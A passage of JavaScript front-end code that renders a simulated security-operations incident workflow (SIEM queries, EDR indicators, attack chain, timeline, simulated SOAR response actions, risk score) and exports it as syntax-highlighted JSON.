            <div class="sw-field"><div class="sw-label">Status</div><div class="sw-value"><span class="sw-tag sw-tag-orange">${s.caseInfo.status}</span></div></div>
            <div class="sw-field"><div class="sw-label">Assigned Analyst</div><div class="sw-value">${s.caseInfo.analyst}</div></div>
            <div class="sw-field"><div class="sw-label">Priority</div><div class="sw-value"><span class="sw-sev ${s.caseInfo.priority.includes('P1') ? 'sw-sev-critical' : 'sw-sev-high'}">${s.caseInfo.priority}</span></div></div>
        </div>
    `)}

    <!-- 3. Incident Summary -->
    ${swSection(3, 'Incident Summary', `
        <div class="sw-summary">${s.summary}</div>
    `)}

    <!-- 4. MITRE ATT&CK Mapping -->
    ${swSection(4, 'MITRE ATT&CK Mapping', `
        <table class="sw-mitre-table">
            <thead><tr><th>Technique</th><th>Name</th><th>Tactic</th></tr></thead>
            <tbody>
                ${s.mitre.map(m => `<tr>
                    <td><span class="sw-mitre-id">${m.technique}</span></td>
                    <td class="sw-mitre-name">${m.name}</td>
                    <td><span class="sw-mitre-tactic">${m.tactic}</span></td>
                </tr>`).join('')}
            </tbody>
        </table>
    `)}

    <!-- 5. SIEM Detection -->
    ${swSection(5, 'SIEM Detection', `
        <div class="sw-field"><div class="sw-label">Log Sources</div>
            <ul class="sw-edr-list">${s.siem.sources.map(src => `<li>${src}</li>`).join('')}</ul>
        </div>
        <div class="sw-field"><div class="sw-label">Detection Logic</div>
            <div class="sw-summary">${s.siem.logic}</div>
        </div>
        <div class="sw-code-label">Splunk SPL</div>
        <div class="sw-code-block">${escapeHTML(s.siem.splunk)}</div>
        <div class="sw-code-label">Microsoft Sentinel KQL</div>
        <div class="sw-code-block">${escapeHTML(s.siem.kql)}</div>
    `)}

    <!-- 6. EDR Detection (CrowdStrike Style) -->
    ${swSection(6, 'EDR Detection — CrowdStrike Falcon Style', `
        <div class="sw-field"><div class="sw-label">Process Behavior</div>
            <ul class="sw-edr-list">${s.edr.process.map(p => `<li>${p}</li>`).join('')}</ul>
        </div>

        <div class="sw-field"><div class="sw-label">Command-Line Patterns</div>
            ${s.edr.cmdline.map(c => `<div class="sw-code-block" style="margin-bottom:6px;padding:10px;max-height:none">${escapeHTML(c)}</div>`).join('')}
        </div>

        <div class="sw-field"><div class="sw-label">Parent → Child Process Chain</div>
            ${s.edr.parentChild.map(pc => `
                <div class="sw-pc-row">
                    <span class="sw-pc-parent">${pc.parent}</span>
                    <span class="sw-pc-arrow">→</span>
                    <span class="sw-pc-child">${pc.child}</span>
                    <span class="sw-pc-note">${pc.note}</span>
                </div>
            `).join('')}
        </div>

        <div class="sw-grid-2" style="margin-top:16px">
            <div>
                <div class="sw-label" style="margin-bottom:8px">IOA (Indicators of Attack)</div>
                ${s.edr.ioa.map(i => `
                    <div class="sw-ioa-card">
                        <div class="sw-ioa-pattern">${i.pattern}</div>
                        <div class="sw-ioa-meta">
                            <span class="sw-sev ${sevClass[i.severity] || ''}">${i.severity}</span>
                            <span style="color:var(--text-muted)">Action: <strong style="color:var(--text-primary)">${i.action}</strong></span>
                        </div>
                    </div>
                `).join('')}
            </div>
            <div>
                <div class="sw-label" style="margin-bottom:8px">IOC (Indicators of Compromise)</div>
                <div class="sw-ioc-card"><div class="sw-ioc-type">IP Addresses</div><div class="sw-ioc-values">${s.edr.ioc.ips.map(v => `<div>${v}</div>`).join('')}</div></div>
                <div class="sw-ioc-card"><div class="sw-ioc-type">Domains</div><div class="sw-ioc-values">${s.edr.ioc.domains.map(v => `<div>${v}</div>`).join('')}</div></div>
                <div class="sw-ioc-card"><div class="sw-ioc-type">File Hashes</div><div class="sw-ioc-values">${s.edr.ioc.hashes.map(v => `<div>${v}</div>`).join('')}</div></div>
                <div class="sw-ioc-card"><div class="sw-ioc-type">File Paths</div><div class="sw-ioc-values">${s.edr.ioc.paths.map(v => `<div>${v}</div>`).join('')}</div></div>
            </div>
        </div>
    `)}

    <!-- 7. XDR Correlation -->
    ${swSection(7, 'XDR Correlation', `
        <div class="sw-xdr-cards">
            <div class="sw-xdr-card"><div class="sw-xdr-card-title">Identity</div><div class="sw-xdr-card-value">${s.xdr.identity}</div></div>
            <div class="sw-xdr-card"><div class="sw-xdr-card-title">Endpoint</div><div class="sw-xdr-card-value">${s.xdr.endpoint}</div></div>
            <div class="sw-xdr-card"><div class="sw-xdr-card-title">Network</div><div class="sw-xdr-card-value">${s.xdr.network}</div></div>
        </div>
        <div class="sw-label" style="margin-bottom:10px">Attack Chain</div>
        <div class="sw-chain">
            ${s.xdr.chain.map((c, i) => `
                ${i > 0 ? '<div class="sw-chain-arrow">→</div>' : ''}
                <div class="sw-chain-stage ${c.status}">
                    <div class="sw-chain-label">${c.stage}</div>
                    <div class="sw-chain-detail">${c.detail}</div>
                </div>
            `).join('')}
        </div>
    `)}

    <!-- 8. Investigation Timeline -->
    ${swSection(8, 'Investigation Timeline', `
        <div class="sw-timeline">
            ${s.timeline.map(t => `
                <div class="sw-tl-event ${t.type}">
                    <div class="sw-tl-time">${t.time}</div>
                    <div class="sw-tl-desc">${t.event}</div>
                </div>
            `).join('')}
        </div>
    `)}

    <!-- 9. Log Evidence -->
    ${swSection(9, 'Log Evidence', `
        <div style="max-height:280px;overflow-y:auto">
            ${s.logs.map(l => `
                <div class="sw-log ${l.type}">
                    <span class="sw-log-num">${String(l.id).padStart(3, '0')}</span>
                    <span class="sw-log-text">${l.text}</span>
                </div>
            `).join('')}
        </div>
    `)}

    <!-- 10. SOAR Response (Simulated) -->
    ${swSection(10, 'SOAR Response — Simulated', `
        <div class="sw-soar-trigger"><strong>TRIGGER:</strong> ${s.soar.trigger}</div>
        <div id="sw-soar-actions">
            ${s.soar.actions.map((a, i) => `
                <div class="sw-soar-action" id="sw-soar-${i}">
                    <span class="sw-soar-action-text">${a.action}</span>
                    <button class="sw-soar-btn ${a.type === 'kill' || a.type === 'isolate' ? 'danger' : ''}" onclick="swExecuteAction(${i})">Execute</button>
                </div>
            `).join('')}
        </div>
        <button class="sw-exec-all" id="sw-exec-all" onclick="swExecuteAll()">Execute All Response Actions</button>
    `)}

    <!-- 11. Response Status -->
    ${swSection(11, 'Response Status', `
        <div id="sw-response-status">
            ${s.soar.actions.map((a, i) => `
                <div class="sw-status-row" id="sw-status-${i}">
                    <span class="sw-status-pending">○</span>
                    <span style="color:var(--text-muted)">${a.action}</span>
                </div>
            `).join('')}
        </div>
    `)}

    <!-- 12. Detection Conditions -->
    ${swSection(12, 'Detection Conditions', `
        <div class="sw-grid-2">
            <div class="sw-field"><div class="sw-label">Threshold</div><div class="sw-value">${s.detection.threshold}</div></div>
            <div class="sw-field"><div class="sw-label">Time Window</div><div class="sw-value">${s.detection.timeWindow}</div></div>
        </div>
    `)}

    <!-- 13. False Positives -->
    ${swSection(13, 'False Positives', `
        <ul class="sw-fp-list">${s.falsePositives.map(f => `<li>${f}</li>`).join('')}</ul>
    `)}

    <!-- 14. Tuning -->
    ${swSection(14, 'Tuning Recommendations', `
        <ul class="sw-tuning-list">${s.tuning.map(t => `<li>${t}</li>`).join('')}</ul>
    `)}

    <!-- 15. Risk Score -->
    ${swSection(15, 'Risk Score', `
        <div class="sw-risk-bar">
            <div class="sw-risk-score ${s.risk.score >= 80 ? 'high' : 'medium'}">${s.risk.score}</div>
            <div style="flex:1">
                <div style="display:flex;justify-content:space-between;margin-bottom:6px">
                    <span style="font-size:11px;color:var(--text-muted)">RISK LEVEL</span>
                    <span style="font-size:11px;color:var(--text-muted)">Confidence: <strong style="color:var(--text-primary)">${s.risk.confidence}</strong></span>
                </div>
                <div class="sw-risk-meter">
                    <div class="sw-risk-fill" style="width:${s.risk.score}%;background:linear-gradient(90deg,#22c55e,#f59e0b ${50/s.risk.score*100}%,#ef4444)"></div>
                </div>
                <div style="display:flex;justify-content:space-between;margin-top:4px;font-size:10px;color:var(--text-muted)">
                    <span>0</span><span>25</span><span>50</span><span>75</span><span>100</span>
                </div>
            </div>
        </div>
    `)}

    `;

    // Animate risk bar
    setTimeout(() => {
        const fill = body.querySelector('.sw-risk-fill');
        if (fill) { fill.style.width = '0%'; setTimeout(() => { fill.style.width = s.risk.score + '%'; }, 50); }
    }, 100);

    // Store current scenario for SOAR actions
    window._swCurrentScenario = s;
    window._swActionsDone = {};
}

function swSection(num, title, content, collapsed = false) {
    const id = `sw-sec-${num}`;
    return `
    <div class="sw-section">
        <div class="sw-section-head" onclick="swToggleSection('${id}')">
            <div class="sw-section-title">
                <span class="sw-section-num">${num}</span>
                ${title}
            </div>
            <span class="sw-chevron ${collapsed ? '' : 'open'}" id="chev-${id}">▸</span>
        </div>
        <div class="sw-section-body ${collapsed ? 'collapsed' : ''}" id="${id}">
            ${content}
        </div>
    </div>`;
}

function swToggleSection(id) {
    const body = document.getElementById(id);
    const chev = document.getElementById('chev-' + id);
    if (!body) return;
    body.classList.toggle('collapsed');
    chev?.classList.toggle('open');
}

function swExecuteAction(idx) {
    const actionEl = document.getElementById(`sw-soar-${idx}`);
    const statusEl = document.getElementById(`sw-status-${idx}`);
    if (!actionEl || window._swActionsDone?.[idx]) return;

    window._swActionsDone[idx] = true;

    // Update SOAR action row
    const btn = actionEl.querySelector('.sw-soar-btn');
    btn.outerHTML = '<span class="sw-soar-done">✔ Executed</span>';
    actionEl.classList.add('done');

    // Update status row
    if (statusEl) {
        const actionText = window._swCurrentScenario?.soar.actions[idx]?.action || '';
        statusEl.innerHTML = `
            <span class="sw-status-check">✔</span>
            <span style="color:#22c55e">${actionText} — <strong>COMPLETED</strong> (simulated)</span>
        `;
    }

    // Check if all done
    const total = window._swCurrentScenario?.soar.actions.length || 0;
    const doneCount = Object.keys(window._swActionsDone).length;
    if (doneCount >= total) {
        const execAll = document.getElementById('sw-exec-all');
        if (execAll) { execAll.disabled = true; execAll.textContent = '✔ All Actions Executed'; }
    }
}

function swExecuteAll() {
    const total = window._swCurrentScenario?.soar.actions.length || 0;
    for (let i = 0; i < total; i++) {
        setTimeout(() => swExecuteAction(i), i * 400);
    }
}

// ── JSON Schema Export ──
function swToJSON(s) {
    return {
        alert: {
            rule_name: s.alert.rule,
            severity: s.alert.severity,
            host: s.alert.host,
            user: s.alert.user,
            source_ip: s.alert.srcIp,
            status: s.alert.status,
        },
        case: {
            case_id: s.caseInfo.id,
            status: s.caseInfo.status,
            analyst: s.caseInfo.analyst,
            priority: s.caseInfo.priority,
        },
        incident_summary: s.summary,
        mitre: s.mitre.map(m => ({ technique: m.technique, name: m.name, tactic: m.tactic })),
        siem: {
            log_sources: s.siem.sources,
            logic: s.siem.logic,
            splunk: s.siem.splunk.trim(),
            kql: s.siem.kql.trim(),
        },
        edr: {
            process_behavior: s.edr.process,
            command_line: s.edr.cmdline,
            parent_child: s.edr.parentChild.map(p => `${p.parent} → ${p.child} (${p.note})`),
            ioa: s.edr.ioa.map(i => ({ pattern: i.pattern, severity: i.severity, action: i.action })),
            ioc: {
                ip: s.edr.ioc.ips,
                domain: s.edr.ioc.domains,
                hash: s.edr.ioc.hashes,
                file_path: s.edr.ioc.paths,
            },
        },
        xdr: {
            correlation: [
                `Identity: ${s.xdr.identity}`,
                `Endpoint: ${s.xdr.endpoint}`,
                `Network: ${s.xdr.network}`,
            ],
            attack_chain: s.xdr.chain.map(c => ({ stage: c.stage, detail: c.detail, status: c.status })),
        },
        timeline: s.timeline.map(t => ({ time: t.time, event: t.event, type: t.type })),
        logs: s.logs.map(l => ({ entry: l.text, level: l.type })),
        soar: {
            trigger: s.soar.trigger,
            actions: s.soar.actions.map(a => a.action),
        },
        response_status: s.soar.actions.map(a => `${a.action} (simulated)`),
        conditions: {
            threshold: s.detection.threshold,
            time_window: s.detection.timeWindow,
        },
        false_positives: s.falsePositives,
        tuning: s.tuning,
        risk: {
            score: s.risk.score,
            confidence: s.risk.confidence,
        },
    };
}

function swSyntaxHighlight(json) {
    const str = JSON.stringify(json, null, 2);
    return str.replace(/("(\\u[a-fA-F0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?|\bnull\b)/g, (match) => {
        if (/^"/.test(match)) {
            if (/:$/.test(match)) {
                return `<span class="sw-json-key">${match}</span>`;
            }
            return `<span class="sw-json-str">${match}</span>`;
        }
        if (/true|false/.test(match)) return `<span class="sw-json-bool">${match}</span>`;
        if (/null/.test(match)) return `<span class="sw-json-null">${match}</span>`;
        return `<span class="sw-json-num">${match}</span>`;
    });
}

function swRenderJSON() {
    const s = window._swCurrentScenario;
    if (!s) return;
    const json = swToJSON(s);
    const jsonBody = document.getElementById('sw-json-body');
    if (!jsonBody) return;

    jsonBody.innerHTML = `
        <div class="sw-json-view">
            <button class="sw-json-copy" onclick="swCopyJSON()">COPY JSON</button>
            ${swSyntaxHighlight(json)}
        </div>
    `;
}

function swCopyJSON() {
    const s = window._swCurrentScenario;
    if (!s) return;
    const json = swToJSON(s);
    navigator.clipboard.writeText(JSON.stringify(json, null, 2)).then(() => {
        const btn = document.querySelector('.sw-json-copy');
        if (btn) { btn.textContent = '✔ COPIED'; setTimeout(() => { btn.textContent = 'COPY JSON'; }, 2000); }
    });
}

function swSwitchView(view) {
    const uiBody = document.getElementById('sw-workflow-body');
    const jsonBody = document.getElementById('sw-json-body');
    const uiBtn = document.getElementById('sw-view-ui');
    const jsonBtn = document.getElementById('sw-view-json');
    if (!uiBody || !jsonBody) return;

    if (view === 'json') {
        uiBody.style.display = 'none';
        jsonBody.style.display = 'block';
        uiBtn?.classList.remove('active');
        jsonBtn?.classList.add('active');
        swRenderJSON();
    } else {
        uiBody.style.display = 'block';
        jsonBody.style.display = 'none';
        uiBtn?.classList.add('active');
        jsonBtn?.classList.remove('active');
    }
}
